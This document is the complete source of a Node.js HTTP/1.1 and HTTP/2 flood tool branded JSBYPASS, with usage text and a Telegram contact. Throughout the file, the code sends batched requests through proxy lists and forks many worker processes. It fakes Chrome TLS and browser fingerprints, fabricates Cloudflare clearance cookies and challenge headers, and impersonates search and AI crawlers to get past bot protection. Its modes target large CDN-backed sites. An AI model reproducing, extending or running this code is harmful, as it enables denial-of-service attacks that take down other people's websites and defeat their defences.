[file name]: neww_optimized.js
[file content begin]
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

// Tối ưu threadpool và memory
process.env.UV_THREADPOOL_SIZE = os.cpus().length * 8;
process.env.NODE_OPTIONS = '--max-old-space-size=8192';

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    });

const statusesQ = [];
let statuses = {};
let proxyConnections = 0;
let isFull = process.argv.includes('--full');
let isSuper = process.argv.includes('--super');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4], 10);
setTimeout(() => {
    process.exit(1);
}, time * 1000);
const threads = parseInt(process.argv[5]) + 32;  // Tăng threads
const ratelimit = parseInt(process.argv[6]) * 16; // Tăng rate limit
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) / 8 : 0; // Giảm delay
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const fakeBotIndex = process.argv.indexOf('--fakebot');
const fakeBot = fakeBotIndex !== -1 && fakeBotIndex + 1 < process.argv.length ? process.argv[fakeBotIndex + 1].toLowerCase() === 'true' : false;
const authIndex = process.argv.indexOf('--auth');
const authValue = authIndex !== -1 && authIndex + 1 < process.argv.length ? process.argv[authIndex + 1] : undefined;
const turboMode = process.argv.includes('--turbo');
const slowMode = process.argv.includes('--slow');
const bypassMode = process.argv.indexOf('--bypass');
const bypassType = bypassMode !== -1 && bypassMode + 1 < process.argv.length ? process.argv[bypassMode + 1] : 'auto';
const aggressiveMode = process.argv.includes('--aggressive');

// Optimized random string generation
const randomCache = new Map();
function randstr(length, cacheKey = null) {
    if (cacheKey && randomCache.has(cacheKey)) {
        return randomCache.get(cacheKey);
    }
    
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    
    // Use crypto for better performance
    const randomBytes = crypto.randomBytes(length);
    for (let i = 0; i < length; i++) {
        result += chars[randomBytes[i] % chars.length];
    }
    
    if (cacheKey) {
        randomCache.set(cacheKey, result);
        setTimeout(() => randomCache.delete(cacheKey), 500);
    }
    
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const randomBytes = crypto.randomBytes(length);
    for (let i = 0; i < length; i++) {
        result += characters[randomBytes[i] % characters.length];
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return randstr(length);
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`

     ${chalk.magenta('Telegram:')} t.me/bixd08 | ${chalk.magenta('JSBYPASS')} - ${chalk.magenta('Update')}: 19/08/2025
     ${chalk.blue('Usage:')}
        node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [ Options ]
     ${chalk.red('Example:')}
        node ${process.argv} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --auth Bearer:abc123 --randrate --full --fakebot true
     ${chalk.yellow('Options:')}
      --randpath 1/2/3 - Query string with rand ex 1 - ?cf__chl_tk  2 - ?randomstring 3 - ?q=fwfwwfwfw
      --cache - Enable cache bypass techniques
      --debug - Show status codes
      --full - Attack for big backends (Amazon, Akamai, Cloudflare)
      --super - Super aggressive mode
      --turbo - Maximum speed mode
      --aggressive - Extreme aggression mode
      --slow - Slow but stealthy mode
      --delay <1-50> - Delay between requests 1-50 ms
      --connect - Keep proxy connection
      --cookie "f=f" - Custom cookie, supports %RAND% ex: "bypassing=%RAND%"
      --bfm true/null - Enable bypass bot fight mode
      --referer https://target.com / rand - Custom referer or random domain
      --postdata "username=admin&password=123" - POST data, format "username=f&password=f"
      --auth <type>:<value> - Authorization header, ex: "Bearer:abc123", "Basic:user:pass", or "Custom:xyz" (supports %RAND%)
      --randrate - Randomizer rate 1 to 90 for bypass
      --header "name:value#name2:value2" - Custom headers
      --fakebot true/false - Use bot User-Agent (TelegramBot, GPTBot, GoogleBot, etc.)

    `);

    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Protocol only supports https://');
    process.exit(1);
}

if (!fs.existsSync(proxyfile)) {
    console.error('Proxy file does not exist');
    process.exit(1);
}

// Optimized proxy loading
const proxy = fs.readFileSync(proxyfile, 'utf8')
    .replace(/\r/g, '')
    .split('\n')
    .filter(line => {
        const [host, port] = line.split(':');
        return host && port && !isNaN(port);
    });

if (proxy.length === 0) {
    console.error('No valid proxy');
    process.exit(1);
}

console.log(chalk.green(`✓ Loaded ${proxy.length} proxies`));

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    return alphabet[Math.floor(Math.random() * alphabet.length)];
};

let randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 1000); // Tăng tốc độ thay đổi

let hcookie = '';
let currentRefererValue = refererValue === 'rand' ? 'https://' + randstr(6) + ".net" : refererValue;
if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}
if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${randstr(6)}=${randstr(6)}` : `${randstr(6)}=${randstr(6)}`;
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

const url = new URL(target);

// Enhanced frame functions with caching
const frameCache = new Map();

function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    const cacheKey = `${streamId}_${type}_${flags}_${payload.length}`;
    if (payload.length < 1024 && frameCache.has(cacheKey)) {
        const cached = frameCache.get(cacheKey);
        if (cached.payload.equals(payload)) {
            return cached.frame;
        }
    }
    
    const length = payload.length;
    const frame = Buffer.alloc(9 + length);
    
    frame.writeUInt32BE((length << 8) | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    
    if (length > 0) {
        payload.copy(frame, 9);
    }
    
    if (payload.length < 1024) {
        frameCache.set(cacheKey, { frame, payload });
        if (frameCache.size > 5000) {
            const firstKey = frameCache.keys().next().value;
            frameCache.delete(firstKey);
        }
    }
    
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    if (data.length < 9 + offset + length) return null;

    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }

    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    return encodeFrame(streamId, 3, Buffer.from([errorCode >> 24, errorCode >> 16, errorCode >> 8, errorCode & 0xFF]));
}

// Enhanced JA3 fingerprints
const REAL_CHROME_JA3 = [
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-13172-16-13-18-51-45-43-27-17513,29-23-24,0",
    "771,4865-4867-4866-49195-49199-52393-49196-49200-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-13-18-51-45-43-27-17513-21,29-23-24,0",
    "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-13172-16-13-18-51-45-43-27-17513,29-23-24,0"
];

const REAL_HTTP2_SETTINGS = {
    HEADER_TABLE_SIZE: 4096,
    ENABLE_PUSH: 1,
    MAX_CONCURRENT_STREAMS: 1000,
    INITIAL_WINDOW_SIZE: 6291456,
    MAX_FRAME_SIZE: 16384,
    MAX_HEADER_LIST_SIZE: 16384
};

// Enhanced browser fingerprint with caching
let cachedFingerprint = null;
let fingerprintTimestamp = 0;

function getBrowserFingerprint() {
    const now = Date.now();
    if (cachedFingerprint && (now - fingerprintTimestamp) < 15000) {
        return cachedFingerprint;
    }
    
    cachedFingerprint = generateBrowserFingerprint();
    fingerprintTimestamp = now;
    return cachedFingerprint;
}

function generateBrowserFingerprint() {
    const screenSizes = [
        { width: 1366, height: 768 },
        { width: 1920, height: 1080 },
        { width: 2560, height: 1440 }
    ];

    const languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "es-ES,es;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8"
    ];

    const webGLVendors = [
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) UHD Graphics 620, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 580, Direct3D11 vs_5_0 ps_5_0)" }
    ];

    const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];
    let chromeVersion = getRandomInt(130, 135);
    
    const botUserAgents = [
        'TelegramBot (like TwitterBot)',
        'GPTBot/1.0 (+https://openai.com/gptbot)',
        'Googlebot/2.1 (+http://www.google.com/bot.html)', 
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Twitterbot/1.0',
        'Discordbot/2.0 (+https://discordapp.com)'
    ];
    
    const userAgent = fakeBot 
        ? botUserAgents[Math.floor(Math.random() * botUserAgents.length)]
        : `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion}.0.0.0 Safari/537.36`;
    
    const selectedWebGL = webGLVendors[Math.floor(Math.random() * webGLVendors.length)];
    const canvasSeed = crypto.createHash('md5').update(userAgent + 'canvas').digest('hex').substring(0, 8);

    return {
        screen: {
            width: screen.width,
            height: screen.height
        },
        navigator: {
            userAgent: userAgent,
            language: languages[Math.floor(Math.random() * languages.length)],
            sextoy: fakeBot ? '"Not A;Brand";v="99", "Chromium";v="130"' : `"Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not?A_Brand";v="24"`,
            platform: 'Win32'
        },
        webgl: selectedWebGL,
        canvas: canvasSeed,
        timezone: -Math.floor(Math.random() * 12) * 60
    };
}

const fingerprint = getBrowserFingerprint();

// Enhanced JA3 selection
const selectedJa3 = REAL_CHROME_JA3[Math.floor(Math.random() * REAL_CHROME_JA3.length)];
const [version, ciphersStr, extensionsStr, curvesStr] = selectedJa3.split(',');

const ja3Fingerprint = {
    ciphers: ciphersStr.split('-').map(c => c.trim()),
    extensions: extensionsStr.split('-').map(e => e.trim()),
    curves: curvesStr.split('-').map(c => c.trim()),
    signatureAlgorithms: ["ecdsa_secp256r1_sha256","rsa_pss_rsae_sha256","rsa_pkcs1_sha256"]
};

const http2Fingerprint = REAL_HTTP2_SETTINGS;

// Enhanced header generation
function generateDynamicHeaders() {
    const secChUaFullVersion = `${getRandomInt(130, 135)}.0.${getRandomInt(6000, 7000)}.${getRandomInt(0, 200)}`;
    const platforms = ['Windows', 'macOS', 'Linux'];
    const platformVersion = `${getRandomInt(10, 14)}.${getRandomInt(0, 9)}`;
    
    const headers = [
        ['user-agent', fingerprint.navigator.userAgent],
        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'],
        ['sec-ch-ua', fingerprint.navigator.sextoy],
        ['sec-ch-ua-mobile', '?0'],
        ['sec-ch-ua-platform', `"${platforms[Math.floor(Math.random() * platforms.length)]}"`],
        ['sec-ch-ua-full-version', secChUaFullVersion],
        ['sec-ch-ua-platform-version', platformVersion],
        ['accept-language', fingerprint.navigator.language],
        ['accept-encoding', 'gzip, deflate, br, zstd'],
        ['sec-fetch-site', 'none'],
        ['sec-fetch-mode', 'navigate'],
        ['sec-fetch-dest', 'document']
    ];
    
    // Add random additional headers
    if (Math.random() > 0.5) headers.push(['dnt', '1']);
    if (Math.random() > 0.6) headers.push(['upgrade-insecure-requests', '1']);
    if (Math.random() > 0.4) headers.push(['save-data', 'on']);
    
    return shuffle(headers);
}

function generateCfClearanceCookie() {
    const timestamp = Math.floor(Date.now() / 1000);
    const clientId = randstr(16);
    const version = getRandomInt(17494, 17500);
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}${ja3Fingerprint.ciphers.join('')}`)
        .digest('hex')
        .substring(0, 16);
    
    return `cf_clearance=${clientId}.${timestamp}.${version}.${hashPart}`;
}

function generateTurnstileHeaders() {
    const locations = ['iad', 'ord', 'syd', 'sin', 'fra', 'ams', 'lhr', 'cdg', 'hkg', 'gru'];
    return [
        ['cf-chl-jschl-tk', randstr(40)],
        ['cf-ray', `${randstr(12)}-${locations[Math.floor(Math.random() * locations.length)]}`]
    ];
}

function generateChallengeHeaders() {
    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', randstr(32)],
        ['cf-chl-response', randstr(16)]
    ];
}

function generateAuthorizationHeader(authValue) {
    if (!authValue) return null;
    const [type, ...valueParts] = authValue.split(':');
    const value = valueParts.join(':');
    
    if (type.toLowerCase() === 'bearer') {
        if (value === '%RAND%') {
            const payload = { sub: randstr(8), iat: Math.floor(Date.now() / 1000) };
            return `Bearer ${Buffer.from(JSON.stringify(payload)).toString('base64url')}.${randstr(32)}`;
        }
        return `Bearer ${value.replace('%RAND%', randstr(16))}`;
    }
    return null;
}

function getRandomMethod() {
    return Math.random() > 0.7 ? 'HEAD' : (Math.random() > 0.5 ? 'POST' : 'GET');
}

// Optimized request generation
const requestCache = new Map();

function generateRequestPayload() {
    const method = enableCache ? getRandomMethod() : reqmethod;
    const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
    const cacheKey = `${method}_${path}_${Date.now() % 60000}`; // Cache for 1 minute
    
    if (requestCache.has(cacheKey)) {
        return requestCache.get(cacheKey);
    }
    
    let payload;
    if (forceHttp == 1 || Math.random() < 0.3) {
        // HTTP/1.1
        payload = {
            type: 'http1',
            data: `${method} ${path}${url.search || ''} HTTP/1.1\r\n` +
                  `Host: ${url.hostname}\r\n` +
                  `User-Agent: ${fingerprint.navigator.userAgent}\r\n` +
                  `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n` +
                  `Accept-Encoding: gzip, deflate, br\r\n` +
                  `Accept-Language: ${fingerprint.navigator.language}\r\n` +
                  `${hcookie ? `Cookie: ${hcookie}\r\n` : ''}` +
                  `${currentRefererValue ? `Referer: ${currentRefererValue}\r\n` : ''}` +
                  `${generateAuthorizationHeader(authValue) ? `Authorization: ${generateAuthorizationHeader(authValue)}\r\n` : ''}` +
                  `Connection: keep-alive\r\n\r\n`
        };
    } else {
        // HTTP/2
        const streamId = 1 + Math.floor(Math.random() * 100) * 2;
        const headers = [
            [':method', method],
            [':authority', url.hostname],
            [':scheme', 'https'],
            [':path', path],
            ['user-agent', fingerprint.navigator.userAgent],
            ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8']
        ];
        
        const hpack = new HPACK();
        const encodedHeaders = hpack.encode(headers);
        const frame = encodeFrame(streamId, 1, encodedHeaders, 0x05);
        
        payload = {
            type: 'http2',
            streamId: streamId,
            data: frame
        };
    }
    
    requestCache.set(cacheKey, payload);
    if (requestCache.size > 1000) {
        const firstKey = requestCache.keys().next().value;
        requestCache.delete(firstKey);
    }
    
    return payload;
}

function handleQuery(query) {
    if (query === '1') {
        return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return url.pathname + `?${randomPathSuffix}=${randstr(6)}`;
    } else if (query === '3') {
        return url.pathname + '?q=' + generateRandomString(6, 12) + '&' + generateRandomString(6, 12);
    }
    return url.pathname;
}

function generateCacheQuery() {
    return `?_=${Date.now()}&r=${randstr(8)}`;
}

function colorizeStatus(status, count) {
    const greenStatuses = ['200', '404'];
    const redStatuses = ['403', '429'];
    const yellowStatuses = ['503', '502', '522', '520', '521', '523', '524'];

    let coloredStatus;
    if (greenStatuses.includes(status)) {
        coloredStatus = chalk.green.bold(status);
    } else if (redStatuses.includes(status)) {
        coloredStatus = chalk.red.bold(status);
    } else if (yellowStatuses.includes(status)) {
        coloredStatus = chalk.yellow.bold(status);
    } else {
        coloredStatus = chalk.gray.bold(status);
    }

    const underlinedCount = chalk.underline(count);
    return `${coloredStatus}: ${underlinedCount}`;
}

// Enhanced attack function with multi-connection support
function enhancedGo() {
    const proxyIndex = Math.floor(Math.random() * proxy.length);
    const [proxyHost, proxyPort] = proxy[proxyIndex].split(':');
    
    if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
        setTimeout(enhancedGo, 10);
        return;
    }
    
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        proxyConnections++;
        
        netSocket.once('data', () => {
            const tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: ja3Fingerprint.ciphers.join(':'),
                sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
                secureOptions: 
                    crypto.constants.SSL_OP_NO_SSLv2 |
                    crypto.constants.SSL_OP_NO_SSLv3 |
                    crypto.constants.SSL_OP_NO_TLSv1 |
                    crypto.constants.SSL_OP_NO_TLSv1_1,
                secure: true,
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.destroy();
                        enhancedGo();
                        return;
                    }
                    
                    // HTTP/1.1 attack
                    function http1Attack() {
                        const requests = [];
                        const batchSize = aggressiveMode ? 50 : isSuper ? 30 : isFull ? 20 : 10;
                        
                        for (let i = 0; i < batchSize; i++) {
                            const payload = generateRequestPayload();
                            if (payload.type === 'http1') {
                                requests.push(payload.data);
                            }
                        }
                        
                        const combinedRequest = requests.join('');
                        tlsSocket.write(combinedRequest, (err) => {
                            if (!err) {
                                const nextDelay = turboMode ? 1 : aggressiveMode ? 5 : slowMode ? 100 : 20;
                                setTimeout(http1Attack, nextDelay);
                            } else {
                                tlsSocket.destroy();
                                enhancedGo();
                            }
                        });
                    }
                    
                    http1Attack();
                } else {
                    if (forceHttp == 1) {
                        tlsSocket.destroy();
                        enhancedGo();
                        return;
                    }
                    
                    // HTTP/2 attack
                    let hpack = new HPACK();
                    hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);
                    
                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, http2Fingerprint.HEADER_TABLE_SIZE],
                            [2, http2Fingerprint.ENABLE_PUSH],
                            [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
                            [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
                            [5, http2Fingerprint.MAX_FRAME_SIZE],
                            [6, http2Fingerprint.MAX_HEADER_LIST_SIZE]
                        ]))
                    ];
                    
                    tlsSocket.write(Buffer.concat(frames));
                    
                    function http2Attack() {
                        const frames = [];
                        const batchSize = aggressiveMode ? 100 : isSuper ? 60 : isFull ? 40 : 20;
                        
                        for (let i = 0; i < batchSize; i++) {
                            const payload = generateRequestPayload();
                            if (payload.type === 'http2') {
                                frames.push(payload.data);
                                
                                // Add priority frame
                                if (Math.random() > 0.5) {
                                    const priorityPayload = Buffer.alloc(5);
                                    priorityPayload.writeUInt32BE(payload.streamId - 2 || 1, 0);
                                    priorityPayload.writeUInt8(100 + Math.floor(Math.random() * 155), 4);
                                    frames.push(encodeFrame(payload.streamId, 2, priorityPayload, 0));
                                }
                            }
                        }
                        
                        if (frames.length > 0) {
                            tlsSocket.write(Buffer.concat(frames), (err) => {
                                if (!err) {
                                    const nextDelay = turboMode ? 1 : aggressiveMode ? 3 : slowMode ? 50 : 10;
                                    setTimeout(http2Attack, nextDelay);
                                } else {
                                    tlsSocket.destroy();
                                    enhancedGo();
                                }
                            });
                        }
                    }
                    
                    http2Attack();
                    
                    // Handle responses for debugging
                    tlsSocket.on('data', (data) => {
                        try {
                            const frame = decodeFrame(data);
                            if (frame && frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status');
                                if (status) {
                                    const statusCode = status[1];
                                    if (!statuses[statusCode]) statuses[statusCode] = 0;
                                    statuses[statusCode]++;
                                }
                            }
                        } catch (e) {}
                    });
                }
                
                tlsSocket.on('error', () => {
                    tlsSocket.destroy();
                    enhancedGo();
                });
            }).on('error', () => {
                tlsSocket?.destroy();
                enhancedGo();
            });
        });
        
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nConnection: Keep-Alive\r\n\r\n`);
    }).on('error', () => {
        netSocket.destroy();
        setTimeout(enhancedGo, 50);
    }).on('close', () => {
        setTimeout(enhancedGo, 50);
    });
}

// Monitoring timer
setInterval(() => {
    timer++;
}, 1000);

// Dynamic adjustment
setInterval(() => {
    if (timer <= 30) {
        custom_header += 1000;
        custom_window += 10000;
        custom_table += 100;
        custom_update += 50000;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 5000);

// Cluster management
if (cluster.isMaster) {
    const workers = {};
    
    // Tạo nhiều worker hơn
    const workerCount = threads > 64 ? 64 : threads;
    for (let i = 0; i < workerCount; i++) {
        const worker = cluster.fork();
        workers[worker.id] = { worker, stats: { requests: 0, errors: 0 } };
    }
    
    console.log(`Attack Lauched with ${workerCount} workers`);

    cluster.on('exit', (worker) => {
        delete workers[worker.id];
        cluster.fork();
    });

    cluster.on('message', (worker, message) => {
        if (workers[worker.id]) {
            workers[worker.id].stats = message;
        }
    });
    
    if (debugMode) {
        setInterval(() => {
            let totalStatuses = {};
            let totalConnections = 0;
            let totalRequests = 0;
            
            for (let id in workers) {
                const workerData = workers[id];
                if (workerData.worker.state === 'online' && workerData.stats.statuses) {
                    for (let code in workerData.stats.statuses) {
                        if (!totalStatuses[code]) totalStatuses[code] = 0;
                        totalStatuses[code] += workerData.stats.statuses[code];
                    }
                    totalConnections += workerData.stats.proxyConnections || 0;
                    totalRequests += workerData.stats.requests || 0;
                }
            }
            
            const statusString = Object.entries(totalStatuses)
                .map(([status, count]) => colorizeStatus(status, count))
                .join(', ');
            
            console.clear();
            console.log(`[${chalk.magenta.bold('JSBYPASS/BixD')}] | Date: [${chalk.blue.bold(new Date().toLocaleString('en-US'))}] | Status: [${statusString}] | ProxyConnect: [${chalk.cyan.bold(totalConnections)}] | RPS: [${chalk.green.bold(totalRequests)}]`);
        }, 1000);
    }

    if (!connectFlag) {
        setTimeout(() => process.exit(1), time * 1000);
    }
} else {
    // Worker logic
    let requestCounter = 0;
    setInterval(() => {
        requestCounter = 0;
    }, 1000);
    
    if (connectFlag) {
        setInterval(() => {
            const concurrentAttacks = aggressiveMode ? 32 : isSuper ? 16 : isFull ? 8 : 4;
            for(let i = 0; i < concurrentAttacks; i++) {
                enhancedGo();
                requestCounter++;
            }
        }, delay || 1);
    } else {
        const attackInterval = setInterval(() => {
            if (requestCounter < (aggressiveMode ? 1000 : isSuper ? 500 : isFull ? 200 : 100)) {
                requestCounter++;
                enhancedGo();
            }
        }, turboMode ? 0 : aggressiveMode ? 1 : slowMode ? 10 : 2);
        
        setTimeout(() => {
            clearInterval(attackInterval);
        }, time * 1000);
    }
    
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push({ ...statuses, proxyConnections, requests: requestCounter });
            statuses = {};
            proxyConnections = 0;
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}
[file content end]